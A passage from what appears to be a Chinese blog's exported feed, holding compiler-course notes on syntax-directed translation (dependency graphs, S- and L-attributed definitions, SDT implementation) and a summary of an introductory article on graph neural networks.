src="/2024/08/28/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E7%BF%BB%E8%AF%91/image_S19kZDRenM.png"></p><p>终结符没有继承属性。终结符从词法分析器处获得的属性值被归为综合属性值。</p><p><img src="/2024/08/28/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E7%BF%BB%E8%AF%91/image_86gGbMRuqF.png"></p><p><img src="/2024/08/28/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E7%BF%BB%E8%AF%91/image_URzHkUeZ_z.png"></p><hr><h1 id="3-SDD的求值顺序"><a href="#3-SDD的求值顺序" class="headerlink" title="3 SDD的求值顺序"></a>3 SDD的求值顺序</h1><p>SDD为CFG中的文法符号设置<strong>语义属性</strong>。对于给定的输入串$x$，应用<strong>语义规则</strong>计算分析树中各结点对应的属性值。</p><p>按照什么顺序计算属性值？</p><p>语义规则建立了<strong>属性之间的依赖关系</strong>，在对语法分析树节点的一个属性求值之前，必须首先求出这个属性值<strong>所依赖的所有属性值</strong>。</p><h2 id="3-1-依赖图"><a href="#3-1-依赖图" class="headerlink" title="3.1 依赖图"></a>3.1 依赖图</h2><p><strong>依赖图</strong>是一个描述了分析树中结点属性间依赖关系的<strong>有向图</strong>。分析树中每个标号为$X$的结点的每个属性$a$都对应着依赖图中的一个结点。</p><p>如果属性$X.a$的值依赖于属性$Y.b$的值，则依赖图中有一条从$Y.b$的结点指向$X.a$的结点的有向边。</p><h2 id="3-2-属性值的计算顺序"><a href="#3-2-属性值的计算顺序" class="headerlink" title="3.2 属性值的计算顺序"></a>3.2 属性值的计算顺序</h2><p>可行的求值顺序是满足下列条件的结点序列$N_1 ,N_2 , … , N_k$：如果依赖图中有一条从结点$N_i$到$ N_j$的边（$N_i→N_j$），那么$i &lt; j$（即：在节点序列中，$N_i$排在$N_j $前面），这样的排序将一个有向图变成了一个线性排序，这个排序称为这个图的<strong>拓扑排序</strong>（topological sort）。</p><p><img src="/2024/08/28/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E7%BF%BB%E8%AF%91/image_T0UAWlg4Z7.png"></p><p>从计算的角度看，给定一个SDD，很难确定是否存在某棵语法分析树，使得SDD的属性之间存在循环依赖关系。存在一个SDD的有用子类，它们能够保证对每棵语法分析树都存在一个求值顺序，因为它们不允许产生带有环的依赖图。</p><p>不仅如此，接下来介绍的两类SDD可以和自顶向下及自底向上的语法分析过程一起高效地实现。</p><ul><li>S-属性定义 (S-Attributed Definitions, S-SDD)</li><li>L-属性定义 (L-Attributed Definitions, L-SDD)</li></ul><hr><h1 id="4-S-属性定义与L-属性定义"><a href="#4-S-属性定义与L-属性定义" class="headerlink" title="4 S-属性定义与L-属性定义"></a>4 S-属性定义与L-属性定义</h1><h2 id="4-1-S-属性定义"><a href="#4-1-S-属性定义" class="headerlink" title="4.1 S-属性定义"></a>4.1 S-属性定义</h2><p>仅仅使用<strong>综合属性</strong>的SDD称为S属性的SDD，或S-属性定义、S-SDD。</p><p><img src="/2024/08/28/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E7%BF%BB%E8%AF%91/image_2FRqStDDex.png"></p><p>如果一个SDD是S属性的，可以按照语法分析树节点的任何自底向上顺序来计算它的各个属性值。</p><p>S-属性定义可以在自底向上的语法分析过程中实现。</p><h2 id="4-2-L-属性定义"><a href="#4-2-L-属性定义" class="headerlink" title="4.2 L-属性定义"></a>4.2 L-属性定义</h2><p>L-属性定义（也称为L属性的SDD或L-SDD）的直观含义：在一个产生式所关联的各属性之间，依赖图的边可以从左到右，但不能从右到左（因此称为L属性的，L是Left的首字母）。</p><h2 id="4-3-L-SDD的正式定义"><a href="#4-3-L-SDD的正式定义" class="headerlink" title="4.3 L-SDD的正式定义"></a>4.3 L-SDD的正式定义</h2><p>一个SDD是L-属性定义，当且仅当它的每个属性要么是一个综合属性，要么是满足如下条件的继承属性：假设存在一个产生式$A→X_1X_2…X_n$，其右部符号$X_i (1\leq i \leq n)$的继承属性仅依赖于下列属性：</p><ul><li>$A$的继承属性</li><li>产生式中$X_i$左边的符号$X_1, X_2, … , X_{i-1}$的属性</li><li>$X_i$本身的属性，但$X_i$的全部属性不能在依赖图中形成环路</li></ul><blockquote><p>每个S-属性定义都是L-属性定义</p></blockquote><h2 id="4-4-语义分析要解决的问题"><a href="#4-4-语义分析要解决的问题" class="headerlink" title="4.4 语义分析要解决的问题"></a>4.4 语义分析要解决的问题</h2><ol><li>如何表示语义信息？</li><li>如何计算语义信息（语义属性）？</li></ol><p><img src="/2024/08/28/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E7%BF%BB%E8%AF%91/image_6tJ29GHeuB.png"></p><hr><h1 id="5-语法制导翻译方案SDT"><a href="#5-语法制导翻译方案SDT" class="headerlink" title="5 语法制导翻译方案SDT"></a>5 语法制导翻译方案SDT</h1><p>$$<br>SDD &#x3D; CFG + 语义属性 + 语义规则<br>$$</p><p>无循环依赖SDD的判定：</p><p><img src="/2024/08/28/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E7%BF%BB%E8%AF%91/image_z6r1TBDPlb.png"></p><p>语法制导翻译方案（SDT）是在<strong>产生式右部</strong>中嵌入了<strong>程序片段</strong>（称为<strong>语义动作</strong>）的CFG。</p><p>SDT可以看作是SDD的具体实施方案。</p><p>本节主要关注如何使用SDT来实现两类重要的SDD，因为在这两种情况下，SDT可在语法分析过程中实现：</p><ol><li>基本文法可以使用LR分析技术，且SDD是S属性的</li><li>基本文法可以使用LL分析技术，且SDD是L属性的</li></ol><h2 id="5-1-将S-SDD转换为SDT"><a href="#5-1-将S-SDD转换为SDT" class="headerlink" title="5.1 将S-SDD转换为SDT"></a>5.1 将S-SDD转换为SDT</h2><p>将一个S-SDD转换为SDT的方法：将每个语义动作都放在产生式的最后。</p><p><img src="/2024/08/28/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E7%BF%BB%E8%AF%91/image_LgYSOmzuJ-.png"></p><h2 id="5-2-S-属性定义的SDT-实现"><a href="#5-2-S-属性定义的SDT-实现" class="headerlink" title="5.2 S-属性定义的SDT 实现"></a>5.2 S-属性定义的SDT 实现</h2><p>如果一个S-SDD的基本文法可以使用LR分析技术，那么它的SDT可以在LR语法分析过程中实现。</p><p><img src="/2024/08/28/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E7%BF%BB%E8%AF%91/image_ywoj4qh84R.png"></p><h2 id="5-3-将L-SDD转换为SDT"><a href="#5-3-将L-SDD转换为SDT" class="headerlink" title="5.3 将L-SDD转换为SDT"></a>5.3 将L-SDD转换为SDT</h2><p>如果一个L-SDD的基本文法可以使用LL分析技术，那么它的SDT可以在LL或LR语法分析过程中实现。</p><ul><li>在非递归的预测分析过程中进行语义翻译</li><li>在递归的预测分析过程中进行语义翻译</li><li>在LR分析过程中进行语义翻译</li></ul><p><img src="/2024/08/28/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E7%BF%BB%E8%AF%91/image_eNtN2mXsz2.png"></p><hr><h1 id="6-在非递归的预测分析过程中进行翻译"><a href="#6-在非递归的预测分析过程中进行翻译" class="headerlink" title="6 在非递归的预测分析过程中进行翻译"></a>6 在非递归的预测分析过程中进行翻译</h1><p>扩展语法分析栈：</p><p><img src="/2024/08/28/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E7%BF%BB%E8%AF%91/image_lUUFmXSBTq.png"></p><p>综合记录出栈时，要将综合属性值复制给后面特定的语义动作，变量展开时（即变量本身的记录出栈时），如果其含有继承属性，则要将继承属性值复制给后面特定的语义动作。</p><p><img src="/2024/08/28/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E7%BF%BB%E8%AF%91/image_3yBXezL6Jd.png"></p><hr><h1 id="7-在递归的预测分析过程中进行翻译"><a href="#7-在递归的预测分析过程中进行翻译" class="headerlink" title="7 在递归的预测分析过程中进行翻译"></a>7 在递归的预测分析过程中进行翻译</h1><p>为每个<strong>非终结符</strong>A构造一个<strong>函数</strong>，A的每个<strong>继承属性</strong>对应该函数的一个<strong>形参</strong>，函数的<strong>返回值</strong>是A的<strong>综合属性值</strong>。对出现在A产生式中的每个文法符号的每个<strong>属性</strong>都设置一个<strong>局部变量</strong>。</p><p><strong>非终结符</strong>A的代码根据当前的输入决定使用哪个产生式。</p><p><img src="/2024/08/28/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E7%BF%BB%E8%AF%91/image_hH4iKdHdGM.png"></p><hr><h1 id="8-L-属性定义的自底向上翻译"><a href="#8-L-属性定义的自底向上翻译" class="headerlink" title="8 L-属性定义的自底向上翻译"></a>8 L-属性定义的自底向上翻译</h1><p>给定一个以LL文法为基础的L-SDD，可以修改这个文法，并在LR语法分析过程中计算这个新文法之上的SDD。</p><ol><li>首先构造SDT，在各个非终结符之前放置语义动作来计算它的继承属性，并在产生式后端放置语义动作计算综合属性</li><li>对每个内嵌的语义动作，向文法中引入一个标记非终结符来替换它。每个这样的位置都有一个不同的标记，并且对于任意一个标记M都有一个产生式$M→ε$</li><li>如果标记非终结符M在某个产生式$A→α{a}β$中替换了语义动作$a$，对$a$进行修改得到$a’$，并且将$a’$关联到$M→ε$上。动作$a’$<ul><li>将动作$a$需要的$A$或$α$中符号的任何属性作为M的继承属性进行复制</li><li>按照$a$中的方法计算各个属性，但是将计算得到的这些属性作为M的综合属性</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编译原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论文精读3：GNN技术博客</title>
      <link href="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/"/>
      <url>/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/</url>
      
        <content type="html"><![CDATA[<blockquote><p><font color=green><strong>论文题目</strong></font>：A Gentle Introduction to Graph Neural Networks<br><font color=green><strong>作者</strong></font>：Google<br><font color=green><strong>发表时间</strong></font>：2021年</p></blockquote><h1 id="1-引言"><a href="#1-引言" class="headerlink" title="1 引言"></a>1 引言</h1><p>神经网络已适应利用图的结构和属性。我们探索构建图神经网络所需的组件——并激发它们背后的设计选择。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_fq6wObqoKX.png"></p><p>图就在我们身边；现实世界的对象通常是根据它们与其他事物的联系来定义的。一组对象以及它们之间的联系自然地表达为图形。十多年来，研究人员开发了对图数据进行操作的神经网络（称为图神经网络，或 <code>GNN</code>）。最近的发展提高了他们的能力和表达能力。我们开始看到抗菌药物发现等领域的实际应用，例如physics simulations（物理模拟）、fake news detection（假新闻检测）、traffic prediction（交通预测）和recommendation systems（推荐系统）。</p><p>本文探讨并解释了现代图神经网络。我们将这项工作分为四个部分。首先，我们看看哪种数据最自然地表达为图，以及一些常见的示例。其次，我们探讨图与其他类型数据的不同之处，以及使用图时必须做出的一些专门选择。第三，我们构建了一个现代 <code>GNN</code>，从该领域历史性的建模创新开始，遍历模型的每个部分。我们逐渐从简单的实现转向最先进的 <code>GNN</code>模型。第四，也是最后，我们提供了一个 <code>GNN</code>的playground，您可以在其中尝试真实的任务和数据集，以对 <code>GNN</code>模型的每个组件如何对其做出的预测做出贡献建立更强烈的直觉。</p><hr><h1 id="2-什么是图"><a href="#2-什么是图" class="headerlink" title="2 什么是图"></a>2 什么是图</h1><p>首先，让我们先确定什么是图：图表示实体（节点）集合之间的关系（边）。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_vKXNSClS9U.png"></p><p>为了进一步描述每个节点、边或整个图，我们可以在图的每个部分中存储信息。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_gVMoZXkPNU.png"></p><p>我们还可以通过将方向性与边（有向、无向）相关联来专门化图。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_6hiWD5Z6JK.png"></p><p>图是非常灵活的数据结构，如果现在这看起来很抽象，我们将在下一节中通过示例将其具体化。</p><hr><h1 id="3-图结构以及应用"><a href="#3-图结构以及应用" class="headerlink" title="3 图结构以及应用"></a>3 图结构以及应用</h1><p>你可能已经熟悉某些类型的图形数据，例如社交网络。然而，图表是一种极其强大且通用的数据表示形式，我们将展示两种您可能认为无法建模为图的数据类型：图像和文本。虽然违反直觉，但人们可以通过将图像和文本视为图形来更多地了解图像和文本的对称性和结构，并建立一种直觉，这将有助于理解其他不太像网格的图形数据，我们将在稍后讨论。</p><h2 id="3-1-图片作为图"><a href="#3-1-图片作为图" class="headerlink" title="3.1 图片作为图"></a>3.1 图片作为图</h2><p>我们通常将图像视为具有图像通道的矩形网格，将它们表示为数组（例如，$244 \times 244 \times 3 $浮点数）。<strong>另一种将图像视为具有规则结构的图，其中每个像素代表一个节点，并通过边缘连接到相邻像素。</strong>每个非边界像素正好有 8 个邻居，每个节点存储的信息是表示该像素的 <code>RGB</code>值的 3 维向量。</p><p>可视化图的连通性的一种方法是通过其邻接矩阵。我们对节点进行排序，在本例中，每个节点是一个简单的$ 5 \times 5$笑脸图像中的 25 个像素，并填充一个矩阵$n_{nodes}×n_{nodes}$。如果两个节点共享一条边，则有一个条目。请注意，下面这三种表示形式都是同一数据的不同视图。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_t7srwqhxyz.png"></p><h2 id="3-2-文本作为图"><a href="#3-2-文本作为图" class="headerlink" title="3.2 文本作为图"></a>3.2 文本作为图</h2><p>我们可以通过将索引与每个字符、单词或标记相关联，并将文本表示为这些索引的序列来数字化文本。这将创建一个简单的有向图，其中每个字符或索引都是一个节点，并通过边连接到其后面的节点。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_wAx0Wzdcot.png"></p><p>当然，在实践中，这通常不是文本和图像的编码方式：这些图形表示是多余的，因为所有图像和所有文本都将具有非常规则的结构。例如，图像的邻接矩阵具有带状结构，因为所有节点（像素）都连接在网格中。文本的邻接矩阵只是一条对角线，因为每个单词仅连接到前一个单词和下一个单词。</p><h2 id="3-3-其他可以表示为图的数据"><a href="#3-3-其他可以表示为图的数据" class="headerlink" title="3.3 其他可以表示为图的数据"></a>3.3 其他可以表示为图的数据</h2><p>图是描述你可能已经熟悉的数据的有用工具。让我们继续讨论结构更加异构的数据。在这些示例中，每个节点的邻居数量是可变的（与图像和文本的固定邻居大小相反）。除了图之外，这些数据很难以任何其他方式表达。</p><h3 id="分子作为图"><a href="#分子作为图" class="headerlink" title="分子作为图"></a><strong>分子作为图</strong></h3><p>分子是物质的组成部分，由 <code>3D</code>空间中的原子和电子构成。所有粒子都相互作用，但是当一对原子彼此保持稳定的距离时，我们说它们共享共价键。不同的原子对和键具有不同的距离（例如单键、双键）。将这个 <code>3D</code>对象描述为图是一个非常方便且常见的抽象，其中节点是原子，边是共价键。</p><p>以下是两种常见的分子及其相关图。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_cFGaz6nUQU.png"></p><blockquote><p>（左）香茅醛分子的 <code>3D</code>表示（中）分子中键的邻接矩阵（右）分子的图形表示</p></blockquote><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_ip8P8VeINz.png"></p><blockquote><p>（左）咖啡因分子的 <code>3D</code>表示（中）分子中键的邻接矩阵（右）分子的图形表示</p></blockquote><h3 id="社交网络作为图表"><a href="#社交网络作为图表" class="headerlink" title="社交网络作为图表"></a><strong>社交网络作为图表</strong></h3><p>社交网络是研究人们、机构和组织集体行为模式的工具。我们可以通过将个体建模为节点并将他们的关系建模为边来构建表示人群的图。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_9eyY0CpO-a.png"></p><blockquote><p>（左）戏剧《奥赛罗》中的场景图像。（中）剧中角色之间互动的邻接矩阵。（右）这些交互的图形表示。</p></blockquote><p>与图像和文本数据不同，社交网络不具有相同的邻接矩阵。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_EtdVgrp4tK.png"></p><blockquote><p>（左）空手道锦标赛的图片。（中）空手道俱乐部中人与人之间互动的邻接矩阵。（右）这些交互的图形表示。</p></blockquote><h3 id="引用作为图表"><a href="#引用作为图表" class="headerlink" title="引用作为图表"></a><strong>引用作为图表</strong></h3><p>科学家在发表论文时经常引用其他科学家的工作。我们可以将这些引用网络可视化为一个图，其中每篇论文都是一个节点，每个有向边是一篇论文与另一篇论文之间的引用。此外，我们可以将每篇论文的信息添加到每个节点中，例如摘要的词嵌入。</p><h3 id="其他例子"><a href="#其他例子" class="headerlink" title="其他例子"></a><strong>其他例子</strong></h3><p>在计算机视觉中，我们有时想要标记视觉场景中的对象。然后，我们可以通过将这些对象视为节点，并将它们的关系视为边来构建图。机器学习模型，编程代码和数学方程也可以表述为图，其中变量是节点，边是将这些变量作为输入和输出的操作。您可能会在其中一些上下文中看到术语“数据流图”。</p><p>现实世界的图的结构在不同类型的数据之间可能有很大差异——有些图有很多节点，但它们之间的连接很少，反之亦然。图数据集在节点数、边数和节点连接性方面可能存在很大差异（在给定数据集内以及数据集之间）。</p><blockquote><p>对现实世界中发现的图进行汇总统计。数字取决于特征化决策。更多有用的统计数据和图表可以在 <code>KONECT</code>中找到。</p></blockquote><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_hcrhCmF3v4.png"></p><hr><h1 id="4-图结构可以解决哪些类型的问题"><a href="#4-图结构可以解决哪些类型的问题" class="headerlink" title="4 图结构可以解决哪些类型的问题"></a>4 图结构可以解决哪些类型的问题</h1><p>我们已经描述了一些自然图表的示例，但是我们想要对这些数据执行什么任务？图上的预测任务一般分为三种类型：图级、节点级和边级。</p><p>在图级任务中，我们预测整个图的单个属性。对于节点级任务，我们预测图中每个节点的一些属性。对于边级任务，我们想要预测图中边的属性或存在。</p><p>对于上述三个级别的预测问题（图级、节点级和边级），我们将证明以下所有问题都可以使用单个模型类<code>GNN</code>来解决。但首先，让我们更详细地浏览一下三类图预测问题，并提供每一类的具体示例。</p><h2 id="4-1-图层面任务"><a href="#4-1-图层面任务" class="headerlink" title="4.1 图层面任务"></a>4.1 图层面任务</h2><p>在图级任务中，我们的目标是预测整个图的属性。例如，对于用图表表示的分子，我们可能想要预测该分子闻起来像什么，或者它是否会与与疾病有关的受体结合。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_nvJyfspVFU.png"></p><p>这类似于 <code>MNIST</code>和 <code>CIFAR</code>的图像分类问题，我们希望将标签与整个图像相关联。对于文本，类似的问题是情感分析，我们希望立即识别整个句子的情绪或情感。</p><h2 id="4-2-节点层面任务"><a href="#4-2-节点层面任务" class="headerlink" title="4.2 节点层面任务"></a>4.2 节点层面任务</h2><p>节点级任务涉及预测图中每个节点的身份或角色。</p><p>节点级预测问题的一个典型例子是扎克的空手道俱乐部。该数据集是一个单一的社交网络图，由在政治分歧后宣誓效忠两个空手道俱乐部之一的个人组成。故事是这样的，Hi 先生（教练）和 John H（管理员）之间的不和在空手道俱乐部中造成了分裂。节点代表各个空手道练习者，边代表空手道之外这些成员之间的互动。预测问题是对给定成员在不和之后是否忠诚于 Mr. Hi 或 John H 进行分类。在这种情况下，节点与讲师或管理员之间的距离与该标签高度相关。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_7IvlwWGN__.png"></p><blockquote><p>左边是问题的初始条件，右边是可能的解决方案，其中每个节点都根据联盟进行了分类。该数据集可用于其他图问题，例如无监督学习。</p></blockquote><p>按照图像类比，节点级预测问题类似于图像分割，我们试图标记图像中每个像素的作用。对于文本，类似的任务是预测句子中每个单词的词性（例如名词、动词、副词等）。</p><h2 id="4-3-边层面任务"><a href="#4-3-边层面任务" class="headerlink" title="4.3 边层面任务"></a>4.3 边层面任务</h2><p>图中剩下的预测问题是边缘预测。</p><p>边级推理的一个例子是图像场景理解。除了识别图像中的对象之外，深度学习模型还可用于预测它们之间的关系。我们可以将其表述为边缘级分类：给定代表图像中对象的节点，我们希望预测这些节点中的哪些共享边缘或该边缘的值是什么。如果我们希望发现实体之间的连接，我们可以考虑完全连接的图，并根据其预测值修剪边缘以得到稀疏图。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_ct5sZrdziU.png"></p><blockquote><p>在上面的 (b) 中，原始图像 (a) 被分割为五个实体：每位拳手、裁判、观众和垫子。 (c) 显示了这些实体之间的关系。</p></blockquote><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_nAnNkW-KBj.png"></p><blockquote><p>在左侧，有一个根据之前的视觉场景构建的初始图。右侧是当根据模型的输出修剪一些连接时该图可能的边缘标记。</p></blockquote><hr><h1 id="5-在机器学习中使用图的挑战"><a href="#5-在机器学习中使用图的挑战" class="headerlink" title="5 在机器学习中使用图的挑战"></a>5 在机器学习中使用图的挑战</h1><p>那么，如何使用神经网络来解决这些不同的图形任务呢？第一步是考虑如何表示与神经网络兼容的图。</p><p>机器学习模型通常采用矩形或类似网格的数组作为输入。因此，如何以与深度学习兼容的格式表示它们并不是立即直观的。图形最多包含四种类型的信息，我们可能希望使用这些信息来进行预测：节点、边、全局上下文和连通性。前三个相对简单：例如，对于节点，我们可以通过为每个节点分配一个索引$i$并将特征存储在$node_i$中来形成结点特征矩阵$N$。虽然这些矩阵的样本数量可变，但无需任何特殊技术即可进行处理。</p><p>但是，表示图形的连通性更为复杂。也许最明显的选择是使用邻接矩阵，因为这很容易被拉伸。但是，这种表示方式有一些缺点。从示例数据集表中，我们看到图中的节点数量可能约为数百万个，并且每个节点的边数量可能变化很大。通常，这会导致非常稀疏的邻接矩阵，这在空间上效率低下。</p><p>另一个问题是，有许多邻接矩阵可以编码相同的连通性，并且不能保证这些不同的矩阵会在深度神经网络中产生相同的结果（也就是说，它们不是置换不变的）。</p><p>例如，之前的奥赛罗图可以等同于这两个邻接矩阵来描述。它也可以用节点的所有其他可能的排列来描述。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_joyQxkYkM9.png"></p><blockquote><p>表示同一图形的两个邻接矩阵。</p></blockquote><p>下面的示例显示了可以描述这个包含 4 个节点的小图的每个邻接矩阵。这已经是相当多的邻接矩阵——对于像奥赛罗这样的大例子，这个数字是站不住脚的。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_St7b8pdYuF.png"></p><blockquote><p>所有这些邻接矩阵都表示同一个图形。单击边以将其删除，在“虚拟边”上添加它，矩阵将相应地更新。</p></blockquote><p>表示稀疏矩阵的一种优雅且节省内存的方法是一种表示邻接列表。它们将节点$n_i$和$n_j$之间的边$e_k$联通性描述为邻接列表的第$k$个条目中的元组$(i,j)$。由于我们预计边的数量远低于邻接矩阵的条目数$(n^2_{nodes})$，因此我们避免了在图形的不连贯部分进行计算和存储。</p><p>为了使这个概念具体化，我们可以看到在此规范下如何表示不同图形中的信息：</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_T4gtBZPG8Y.png"></p><blockquote><p>一边是小图，另一边是张量表示中的图信息。</p></blockquote><p>应该注意的是，该图使用每个节点&#x2F;边&#x2F;全局的标量值，但大多数实际的张量表示每个图属性都有向量。我们将处理大小为$[n_{nodes},node_{dim}]$的节点张量，而不是大小为$[n_{nodes}]$的节点张量，其他图形属性也是如此。</p><hr><h1 id="6-图神经网络"><a href="#6-图神经网络" class="headerlink" title="6 图神经网络"></a>6 图神经网络</h1><p>现在，图形的描述采用排列不变的矩阵格式，我们将描述使用图形神经网络 （GNN） 来解决图形预测任务。<strong>GNN 是对图的所有属性（节点、边、全局上下文）的可优化变换，它保留了图的对称性（排列不变性）。</strong>我们将使用 Gilmer 等人提出的“<strong>消息传递神经网络</strong>”框架来构建 GNN。</p><p>使用 Battaglia 等人介绍的 Graph Nets 架构原理图。GNN采用“图进图”的架构，这意味着这些模型类型接受图作为输入，将信息加载到其节点、边和全局上下文中，并逐步转换这些嵌入，<strong>而不改变输入图的连通性</strong>。</p><h2 id="6-1-最简单的GNN"><a href="#6-1-最简单的GNN" class="headerlink" title="6.1 最简单的GNN"></a>6.1 最简单的GNN</h2><p>通过我们上面构建的图形的数值表示（使用向量而不是标量），我们现在已经准备好构建 <code>GNN</code>。我们将从最简单的 <code>GNN</code>架构开始，在这个架构中，我们学习所有图形属性（节点、边、全局）的新嵌入，但我们还没有使用图形的连通性。</p><p>这个<code>GNN</code>在图的每个分量上都使用一个单独的多层感知器（<code>MLP</code>）（或你最喜欢的可微模型），我们称之为<code>GNN</code>层。对于每个节点向量，我们应用 <code>MLP</code>并返回一个学习到的节点向量。我们对每条边都做同样的事情，学习每条边的嵌入，也对全局上下文向量做同样的事情，学习整个图的单个嵌入。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_PT6NcErG-a.png"></p><blockquote><p>简单<code>GNN</code>的单层。图形是输入，每个分量$ (V,E,U)$都由<code>MLP</code>更新以生成新图形。每个函数下标表示<code>GNN</code>模型第$  n  $层的不同图形属性的单独函数。</p></blockquote><p>与神经网络模块或层一样，我们可以将这些<code>GNN</code>层堆叠在一起。</p><p>由于 <code>GNN</code> 不会更新输入图的连通性，因此我们可以使用与输入图相同的邻接列表和相同数量的特征向量来描述 <code>GNN</code> 的输出图。但是，输出图更新了嵌入，因为 <code>GNN</code> 更新了每个节点、边和全局上下文表示。</p><h2 id="6-2-通过Pooling信息进行GNN预测"><a href="#6-2-通过Pooling信息进行GNN预测" class="headerlink" title="6.2 通过Pooling信息进行GNN预测"></a>6.2 通过Pooling信息进行GNN预测</h2><p>我们已经构建了一个简单的<code>GNN</code>，但是我们如何在上面描述的任何任务中做出预测呢？</p><p>我们将考虑二元分类的情况，但这个框架可以很容易地扩展到多类或回归情况。如果任务是对节点进行二元预测，并且图形已经包含节点信息，则方法很简单：对于每个节点嵌入，应用线性分类器。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_3KzHFjgayz.png"></p><blockquote><p>我们可以想象一个社交网络，我们希望通过不使用用户数据（节点）来匿名化用户数据（节点），只使用关系数据（边缘）。此类方案的一个实例是我们在“节点级任务”小节中指定的节点任务。在空手道俱乐部的例子中，这只是使用人们之间的交往次数来确定与Hi先生或John H的联盟。</p></blockquote><p>不管有多少个顶点，这里只有一个全连接层，所有顶点都会共享这一个全连接层的参数。</p><p>然而，事情并不总是那么简单。例如，可能将图形中的信息存储在边中，但节点中没有信息，但仍需要对节点进行预测。我们需要一种方法来从边缘收集信息，并将它们提供给节点进行预测。我们可以通过池化来做到这一点。池化分两个步骤进行：</p><ol><li>对于要池化的每个项目，收集它们的每个嵌入并将它们连接到一个矩阵中。</li><li>然后，通常通过求和运算对收集的嵌入进行聚合。</li></ol><p>用字母$\rho$表示池化操作，并表示我们正在从边收集到节点的信息，如$p_{E_{n} \rightarrow V_{n}}$。</p><p><img 